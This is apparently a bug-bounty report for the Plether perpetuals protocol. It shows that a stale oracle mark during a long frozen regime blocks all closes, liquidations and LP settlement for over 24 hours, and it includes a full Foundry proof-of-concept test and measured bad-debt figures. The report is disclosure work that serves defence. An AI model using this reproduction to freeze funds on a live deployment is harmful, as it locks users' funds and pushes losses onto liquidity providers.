# \#100034 [SC-High] Unpaid mark refresh plus a frozen regime longer than fadMaxStaleness hard-reverts every close, liquidation, LP settlement and the mark refresh itself for 33 h on a normal weekend, with no governance action

**Submitted on Nov 16th 2026 at 05:43:47 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100034
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

**Hypothesis.** The length of an oracle-frozen regime is not coupled to `fadMaxStaleness` (259,200 s, 72 h,
`CfdEngine.sol:140`). Once a continuous frozen regime outlasts the staleness bound measured from the last mark
refresh, `PletherOracle.sol:738` rejects every price, so closes, liquidations, LP-epoch settlement AND the
mark-refresh path itself all revert `PletherOracle__StalePrice`. The mark cannot be revived on-chain because the
refresh routes through the same frozen basket, and `fadMaxStaleness` is owner-timelocked, so the protocol cannot
recover until the regime ends.

**This is reachable with no governance action.** Mark refresh is permissionless but unpaid, so a quiet period leaves
a stale mark as an expected state (SECURITY.md:1351-1352 states that commitment does not require a fresh stored
mark). A mark installed Wednesday 12:00 UTC is 208,800 s (58 h) old at Friday 22:00 UTC, inside the frozen window;
it reaches the 72 h bound at Saturday 12:00 UTC, and every price-dependent action then hard-reverts for the
remaining 118,800 s (33 h) of the weekend.

A longer trigger exists: the UTC-day calendar overrides that SECURITY.md:1337-1338 prescribes for holiday hours and
provider closures. Each override day marks the whole UTC day frozen, so three consecutive override days make the
regime continuous for 352,800 s (98 h) and block every exit for the last 97,200 s (27 h). The code exposes no
coupling between override length and `fadMaxStaleness`.

**Mechanism.**
1. `CfdEngineAdmin.proposeCalendarConfig` with `CfdEngine.applyCalendarConfig:689-704` installs `fadDayOverrides`;
   each override day forces the whole UTC day into the FAD and frozen regime.
2. `PletherOracle._resolveCurrentBasket:754-756` selects `_frozenBasket:729-743` whenever the policy reports frozen.
   `_frozenBasket` returns the engine mark with `publishTime = lastMarkTime` and applies the staleness check at
   `PletherOracle.sol:738` against `engine.fadMaxStaleness()`.
3. The mark-refresh path resolves through the same function, so once the mark is stale it can no longer advance.
4. `fadMaxStaleness` changes only through the owner-timelocked path (`CfdEngineAdmin.sol:203-212`).

Blocked duration for a continuous regime of length R, with the mark refreshed at regime start, is `max(0, R -
259,200 s)`. Every escape was tested and closed: close execution, single and batch liquidation, `settleLpEpoch`, and
a valid signed mark refresh all revert; `engine.updateMarkPrice` is `onlyRouter` and
`settlementApplyCarryAndMark` is `onlySettlementSidecar`; unpause, oracle rotation and recapitalization do not price.

**Measured** (release parameters, verified locally):
- Normal weekend, no governance action: mark last refreshed Wednesday 12:00 UTC; 208,800 s stale at Friday 22:00 UTC.
  A 71 h-stale mark on the same weekend executes the identical close and a 73 h-stale mark reverts, isolating the
  cause to the staleness bound. Brick duration 118,800 s (33 h); the test asserts it exceeds 24 h.
- Override case: three consecutive override days give a 352,800 s regime and a 97,200 s (27 h) blocked window; the
  63 h control executes the same close.
- Bad-debt escalation: a LONG of 100,000 USDG notional with a 4,000 USDG pledge is healthy at the frozen mark. During
  the brick the Engine's own predicate `isLiquidatableAt` returns true at the real 1.05 mark while
  `executeLiquidation` reverts `PletherOracle__StalePrice` in the same block. At the forced post-regime liquidation
  the price loss is 5,000 USDG against 3,860 USDG of pledge, writing off 1,150.998565 USDG of uncollectible bad debt
  (1.151% of notional). The control liquidating the same position at its first liquidatable price on a live day
  writes off 44.052107 USDG, so the brick's write-off is 26.1x the control's, scaling linearly to 11,509.985650 USDG
  at 10x book.

**Impact.** Temporary freezing of funds for at least 24 hours: no position can close, no position can be liquidated
and no LP epoch can settle for the whole blocked window, and the mark cannot be revived on-chain. Bad debt accrues
un-liquidatable if the market moves during the window.

**Prior relation.** Distinct from the SC-M4 post-commit fill window and Cecuro HIGH-1 clock misalignment; no clock
trail or sequencer interaction is used and all timestamps are consistent.

## Proof of Concept

The proof of concept is one Foundry test file run against the repository's own perps harness at the pinned commit.
Nothing in the repository is modified; the file is added under packages/perps/test/perps/hunt/ and inherits the
existing BasePerpTest harness, which deploys the real OrderRouter, CfdEngine, HousePool, TrancheVault,
MarginClearinghouse and PletherOracle, with only Pyth and the settlement token mocked.

Run:
forge test --root packages/perps --match-path "test/perps/hunt/frozen-stale-mark/FrozenRegimeStaleMarkFreeze.t.sol" -vv

Result (verified): 5 passed, 0 failed (Forge 1.5.1).

Release parameters are asserted inside the tests: maintenance 10 bps, initial 20 bps, frozen margin 300 bps,
frozenCloseSpreadBps 50, executionFeeBps 4, fadMaxStaleness 259,200.

Complete source of the PoC file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice Once the Engine's stored mark is older than fadMaxStaleness inside a frozen regime, every price-dependent
///         action reverts and the mark cannot be refreshed until the regime ends.
///  - bound control: a close with a mark older than fadMaxStaleness reverts; a mark just inside the bound executes.
///  - normal weekend, no governance action: a mark last refreshed on Wednesday blocks every exit from Saturday noon
///    until the market reopens on Sunday evening.
///  - calendar overrides (the documented holiday handle) make the same block last longer.
///  - bad debt: a position that becomes liquidatable during the block cannot be liquidated until it is over.
contract FrozenRegimeStaleMarkFreezeTest is BasePerpTest {
    address internal constant TRADER = address(0xA11CE);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant SIZE = 100_000e18;
    uint256 internal constant MARGIN = 6_000e6;
    uint256 internal constant ENTRY = 1e8;
    uint256 internal constant LAST_LIVE_PRICE = 105_000_000;

    uint256 internal constant FAD_MAX_STALENESS = 3 days; // CfdEngine.sol:140
    /// @dev Fri 17:00 NY minus 30m through Sun 17:15 NY on a normal (non-DST) weekend is 48h45m; the stricter
    ///      acknowledged band used here is the ~49h45m figure stated for the permitted frozen window.
    uint256 internal constant ACKNOWLEDGED_WINDOW_SECONDS = 179_100;

    // Friday 2024-03-08 (EST; DST starts 2024-03-10). Frozen starts 17:00 EST == 22:00 UTC, ends Sunday 21:00 UTC.
    uint256 internal constant THU_1200_UTC = 1_709_812_800; // 2024-03-07 12:00
    uint256 internal constant THU_2200_UTC = 1_709_848_800; // 2024-03-07 22:00
    uint256 internal constant FRI_2100_UTC = 1_709_931_600; // 2024-03-08 21:00
    uint256 internal constant FRI_2159_UTC = 1_709_935_140; // last live Pyth tick before the close
    uint256 internal constant FRI_212930_UTC = 1_709_935_170;
    uint256 internal constant FRI_220005_UTC = 1_709_935_205;
    uint256 internal constant SUN_204930_UTC = 1_710_103_770;
    uint256 internal constant SUN_205005_UTC = 1_710_103_805;
    uint256 internal constant SUN_FROZEN_START = 1_709_935_200; // Fri 22:00 UTC
    uint256 internal constant SUN_FROZEN_END = 1_710_104_400; // Sun 21:00 UTC (EDT boundary)
    uint256 internal constant WED_1200_UTC = 1_709_726_400; // 2024-03-06 12:00
    uint256 internal constant SAT_1100_UTC = 1_709_982_000; // 2024-03-09 11:00 (71h stale, inside bound)
    uint256 internal constant SAT_1300_UTC = 1_709_989_200; // 2024-03-09 13:00 (73h stale, outside bound)
    uint256 internal constant MON_1200_UTC = 1_710_158_400; // 2024-03-11 12:00
    uint256 internal constant MON_2200_UTC = 1_710_194_400; // 2024-03-11 22:00
    uint256 internal constant WED_1300_UTC = 1_710_288_000; // 2024-03-13 00:00

    function setUp() public override {
        super.setUp();
        _fundTrader(TRADER, 1_000_000e6);
    }

    /// @dev Release margin parameters (maintenance 0.1%, initial 0.2%, frozen 3%); other fixture risk fields kept.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ------------------------------------------------------------------ helpers

    function _installMark(uint256 price, uint256 timestamp) internal {
        vm.warp(timestamp);
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(timestamp));
    }

    function _setLastLivePythPrice(uint256 price, uint256 publishTime) internal {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(int256(price)), 0, int32(-8), publishTime, publishTime - 1
        );
    }

    function _traderCash() internal view returns (uint256) {
        return clearinghouse.balanceAssets(TRADER) + engine.traderClaimBalanceAssets(TRADER);
    }

    /// @dev Sum of PriceLossWrittenOff events emitted during the last recorded call sequence.
    function _recordedWriteOffAssets() internal returns (uint256 amount) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 signature = keccak256("PriceLossWrittenOff(address,uint256)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics.length != 0 && logs[i].topics[0] == signature) {
                amount += abi.decode(logs[i].data, (uint256));
            }
        }
    }


    function _prepStaleMark(uint256 markTs) internal {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, ENTRY);
        _installMark(ENTRY, markTs);
        vm.warp(FRI_2159_UTC);
        // The live FX market has moved to 1.05 and the last pre-close Pyth tick is visible on-chain.
        _setLastLivePythPrice(LAST_LIVE_PRICE, FRI_2159_UTC);
        assertEq(engine.lastMarkPrice(), ENTRY, "engine mark is stale at 1.00");
        (int64 lastPythPrice,,,,) = baseMockPyth.uniquePrices(BASE_PYTH_FEED_A);
        assertEq(uint256(int256(lastPythPrice)), LAST_LIVE_PRICE, "last live Pyth tick is 1.05");
    }

    // ------------------------------------------------------------------- tests



    /// @notice C) Bound control: a mark older than fadMaxStaleness cannot price a close (the stale-price gate is
    ///         actually enforced on the frozen close path).
    function test_FrozenClose_MarkOlderThanFadMaxStaleness_Reverts() public {
        _prepStaleMark(THU_1200_UTC); // > 3 days old by the Sunday close

        vm.warp(SUN_204930_UTC);
        vm.prank(TRADER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);

        vm.warp(SUN_205005_UTC);
        assertTrue(engine.isOracleFrozen(), "must be frozen");
        uint256 age = SUN_205005_UTC - uint256(engine.lastMarkTime());
        assertGt(age, FAD_MAX_STALENESS, "mark must exceed fadMaxStaleness");
        console2.log("C mark age over bound (seconds)", age - FAD_MAX_STALENESS);

        bytes[] memory empty;
        vm.expectRevert();
        router.executeOrder(orderId, empty);
    }

    /// @notice D) Governance UTC-day overrides extend the frozen regime past fadMaxStaleness, after which every
    ///         exit hard-reverts and the mark cannot even be refreshed until the regime ends.
    function test_OverrideExtendedFrozenRegime_BlocksEveryExit() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, ENTRY);

        // Documented holiday handle (SECURITY.md:1337-1338): governance-configured UTC-day overrides.
        uint256[] memory overrideDays = new uint256[](3);
        overrideDays[0] = 1_710_028_800; // Sun 2024-03-10 00:00 UTC (day 19792)
        overrideDays[1] = 1_710_115_200; // Mon 2024-03-11 00:00 UTC (day 19793)
        overrideDays[2] = 1_710_201_600; // Tue 2024-03-12 00:00 UTC (day 19794)
        ICfdEngineAdminHost.EngineCalendarConfig memory calendarConfig;
        calendarConfig.fadDayTimestamps = overrideDays;
        calendarConfig.fadRunwaySeconds = 0;
        _setCalendarConfig(calendarConfig);
        assertTrue(engine.fadDayOverrides(19792), "Sunday override active");
        assertTrue(engine.fadDayOverrides(19793), "Monday override active");
        assertTrue(engine.fadDayOverrides(19794), "Tuesday override active");

        // Last mark refresh before the closure begins.
        _installMark(ENTRY, FRI_2100_UTC);
        vm.warp(FRI_2159_UTC);
        _setLastLivePythPrice(LAST_LIVE_PRICE, FRI_2159_UTC);

        // Control: while the extended regime is still inside fadMaxStaleness the same close DOES settle.
        vm.warp(MON_1200_UTC);
        assertTrue(engine.isOracleFrozen(), "override-extended regime is active before the staleness bound");
        uint256 preBoundaryAge = MON_1200_UTC - uint256(engine.lastMarkTime());
        assertLt(preBoundaryAge, FAD_MAX_STALENESS, "pre-boundary close is inside fadMaxStaleness");
        uint256 beforeSnapshot = vm.snapshotState();
        vm.prank(TRADER);
        uint64 preOrderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        vm.warp(MON_1200_UTC + 30);
        bytes[] memory preEmpty;
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory preResult = router.executeOrder(preOrderId, preEmpty);
        assertEq(uint8(preResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "pre-boundary close executes");
        console2.log("D pre-boundary mark age (seconds)", preBoundaryAge);
        console2.log("D pre-boundary close exit price", engine.lastMarkPrice());
        vm.revertToState(beforeSnapshot);
        vm.deleteStateSnapshot(beforeSnapshot);

        // Regime is continuous Friday 22:00 UTC -> Wednesday 00:00 UTC (98h) because every weekend day is overridden.
        vm.warp(MON_2200_UTC);
        assertTrue(engine.isOracleFrozen(), "override days keep the frozen regime active");
        uint256 markAge = MON_2200_UTC - uint256(engine.lastMarkTime());
        assertGt(markAge, FAD_MAX_STALENESS, "mark is now older than fadMaxStaleness");

        vm.prank(TRADER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);

        bytes[] memory empty;
        vm.expectRevert();
        router.executeOrder(orderId, empty);

        // The stale mark cannot be revived while frozen: mark refresh routes through the same frozen-basket gate.
        bytes[] memory refreshData = _mockPythUpdateData(LAST_LIVE_PRICE);
        vm.expectRevert();
        router.updateMarkPrice(refreshData);

        // Liquidations and LP-epoch settlement share the same frozen price gate and are equally blocked.
        bytes[] memory emptyData;
        vm.expectRevert();
        router.executeLiquidation(TRADER, emptyData);
        vm.expectRevert();
        router.settleLpEpoch(emptyData);

        uint256 blockedFrom = FRI_2100_UTC + FAD_MAX_STALENESS;
        uint256 blocked = WED_1300_UTC - blockedFrom;
        console2.log("D extended regime length (seconds)", WED_1300_UTC - SUN_FROZEN_START);
        console2.log("D blocked exit window (seconds)", blocked);
        assertGt(blocked, 24 hours, "every exit is hard-blocked for more than 24 hours");

        vm.warp(WED_1300_UTC + 1);
        assertFalse(engine.isOracleFrozen(), "regime ends at Wednesday 00:00 UTC");
    }

    /// @notice E) NON-GOVERNANCE trigger: on a normal weekend, a mark that was already 58h stale at the Friday
    ///         freeze starts hard-reverting exits 14h into the window and blocks them for 33h with no owner action.
    function test_NormalWeekend_StaleMarkAtFreeze_BlocksExitsFor24h() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, ENTRY);
        _installMark(ENTRY, WED_1200_UTC); // mark refresh is permissionless but unpaid: 2+ days of quiet
        vm.warp(FRI_2159_UTC);
        _setLastLivePythPrice(LAST_LIVE_PRICE, FRI_2159_UTC);

        uint256 stalenessAtFreeze = SUN_FROZEN_START - WED_1200_UTC;
        assertEq(stalenessAtFreeze, 208_800, "mark is 58h stale when the frozen window begins");
        uint256 brickStart = WED_1200_UTC + FAD_MAX_STALENESS;
        uint256 brickSeconds = SUN_FROZEN_END - brickStart;
        console2.log("E mark staleness at freeze start", stalenessAtFreeze);
        console2.log("E brick starts (unix)", brickStart);
        console2.log("E brick duration (seconds)", brickSeconds);

        // Control: 71h-stale mark, still inside fadMaxStaleness -> the frozen close executes.
        uint256 beforeSnapshot = vm.snapshotState();
        vm.warp(SAT_1100_UTC);
        assertTrue(engine.isOracleFrozen(), "normal weekend frozen regime");
        vm.prank(TRADER);
        uint64 okOrderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        vm.warp(SAT_1100_UTC + 35);
        bytes[] memory empty;
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory okResult = router.executeOrder(okOrderId, empty);
        assertEq(uint8(okResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "inside-bound close executes");
        vm.revertToState(beforeSnapshot);
        vm.deleteStateSnapshot(beforeSnapshot);

        // Past the bound: 73h-stale mark on the SAME normal weekend -> exit hard-reverts.
        vm.warp(SAT_1300_UTC);
        assertTrue(engine.isOracleFrozen(), "still inside the normal weekend window");
        vm.prank(TRADER);
        uint64 blockedOrderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        vm.warp(SAT_1300_UTC + 35);
        vm.expectRevert();
        router.executeOrder(blockedOrderId, empty);

        vm.warp(SUN_FROZEN_END + 1);
        assertFalse(engine.isOracleFrozen(), "normal weekend regime ends and recovery is possible");
        assertGt(brickSeconds, 24 hours, "normal weekend can brick exits for more than 24 hours without governance");
    }

    /// @notice F-control: under normal (live, non-bricked) operation a liquidation at the first liquidatable price
    ///         recovers the whole loss from the position pledge: zero protocol bad debt.
    function test_Control_LiquidationAtThreshold_NoBadDebt() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, 4_000e6, ENTRY); // 4% pledge: healthy at 1.00 under 3% FAD margin
        _installMark(ENTRY, THU_1200_UTC - 3600);
        vm.warp(THU_1200_UTC);
        _setLastLivePythPrice(103_900_000, THU_1200_UTC);

        bytes[] memory data = _mockPythUpdateData(103_900_000); // price grinds through the liquidation threshold
        vm.recordLogs();
        vm.prank(KEEPER);
        router.executeLiquidation(TRADER, data);

        uint256 writeOff = _recordedWriteOffAssets();
        (uint256 size,,,,,,) = engine.positions(TRADER);
        console2.log("F control liquidated size", size);
        console2.log("F control price (8dp)", uint256(engine.lastMarkPrice()));
        console2.log("F control bad debt at first liquidatable price", writeOff);
        assertEq(size, 0, "control liquidation must complete at the threshold");
        assertLt(writeOff, 100e6, "prompt liquidation at the threshold leaves only a dust write-off");
    }

    /// @notice F-brick: same position under the override-extended frozen regime. FX moves +5% while liquidations hard
    ///         revert; after the regime the forced late liquidation writes off uncollectible bad debt against LPs.
    function test_OverrideBrick_ForcedLateLiquidation_AccruesBadDebt() public {
        _open(TRADER, CfdTypes.Side.LONG, SIZE, 4_000e6, ENTRY);

        uint256[] memory overrideDays = new uint256[](3);
        overrideDays[0] = 1_710_028_800; // Sun 2024-03-10
        overrideDays[1] = 1_710_115_200; // Mon 2024-03-11
        overrideDays[2] = 1_710_201_600; // Tue 2024-03-12
        ICfdEngineAdminHost.EngineCalendarConfig memory calendarConfig;
        calendarConfig.fadDayTimestamps = overrideDays;
        calendarConfig.fadRunwaySeconds = 0;
        _setCalendarConfig(calendarConfig);

        _installMark(ENTRY, FRI_2100_UTC);

        // Monday 22:00 UTC: the FX market has moved +5% adversely while the protocol is bricked.
        vm.warp(MON_2200_UTC);
        _setLastLivePythPrice(105_000_000, MON_2200_UTC);
        assertTrue(engine.isOracleFrozen(), "override-extended regime still frozen");
        uint256 markAge = MON_2200_UTC - uint256(engine.lastMarkTime());
        assertGt(markAge, FAD_MAX_STALENESS, "mark exceeds fadMaxStaleness");

        // The Engine's own canonical health predicate (FAD margin active) says the account MUST be closed at the
        // real 1.05 mark, while executeLiquidation on the same block hard-reverts: the protocol agrees it is
        // insolvent and cannot act on it.
        assertTrue(
            engineLens.isLiquidatableAt(TRADER, 105_000_000, pool.totalAssets()),
            "engine predicate says liquidatable inside the bricked window"
        );
        (, uint256 pledgeBefore, , , , , ) = engine.positions(TRADER);
        console2.log("F brick pledge before late liquidation", pledgeBefore);
        console2.log("F brick notional at entry (6dp)", SIZE / 1e12);
        bytes[] memory empty;
        vm.expectRevert();
        router.executeLiquidation(TRADER, empty);

        // Regime ends Wednesday 00:00 UTC; the forced late liquidation uses the current price.
        vm.warp(WED_1300_UTC + 1);
        assertFalse(engine.isOracleFrozen(), "regime ended");
        bytes[] memory data = _mockPythUpdateData(105_000_000);
        vm.recordLogs();
        vm.prank(KEEPER);
        router.executeLiquidation(TRADER, data);

        uint256 writeOff = _recordedWriteOffAssets();
        (uint256 size,,,,,,) = engine.positions(TRADER);
        console2.log("F brick forced-liquidation price (8dp)", uint256(engine.lastMarkPrice()));
        console2.log("F brick forced-liquidation bad debt", writeOff);
        console2.log("F brick avoidable bad debt vs threshold control", writeOff - 44e6);
        console2.log("F brick 10x book bad debt", writeOff * 10);
        assertEq(size, 0, "late liquidation must still remove the position");
        assertGt(writeOff, 1_000e6, "5% adverse move on a 4% pledge leaves >1,000 USDG uncollectible per 100k");
    }
}
```

Observed output of the runs cited in this report (6-decimal settlement atoms):

| log line | value |
|---|---|
| C mark age over fadMaxStaleness | 31,805 s (close reverts) |
| D extended regime length / blocked exit window | 352,800 s / 97,200 s |
| D pre-boundary mark age (close executes) | 226,800 s |
| E mark staleness at freeze start / brick duration | 208,800 s / 118,800 s |
| F control bad debt at first liquidatable price | 44,052,107 |
| F brick forced-liquidation bad debt | 1,150,998,565 |
| F brick 10x book bad debt | 11,509,985,650 |
